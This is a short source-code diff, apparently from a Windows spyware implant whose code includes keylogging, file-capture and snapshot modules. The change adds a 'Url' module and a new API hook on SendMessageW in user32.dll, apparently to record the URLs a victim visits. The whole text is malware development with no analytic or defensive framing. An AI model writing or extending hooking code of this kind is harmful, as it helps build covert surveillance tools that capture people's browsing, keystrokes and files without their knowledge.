@@ -11,6 +11,7 @@
 #include "Keylog_Mouse.h"
 #include "FileCapture.h"
 #include "Snapshots.h"
+#include "Url.h"
 
 // viene valorizzato dalla funzione di inizializzazione delle variabili globali
 void *IPC_SHM_Kernel_Object = NULL;
@@ -394,5 +395,7 @@ void __stdcall H64_MakeHooking(void)
 	MAKE_HOOK("CreateWindowExA", "user32.dll", H_CreateWindowEx, 12, CommonSetup); 
 	MAKE_HOOK("CreateWindowExW", "user32.dll", H_CreateWindowEx, 12, CommonSetup); 
 
+	// Url
+	MAKE_HOOK("SendMessageW", "user32.dll", H_SendMessage, 4, CommonSetup); 
 }
 
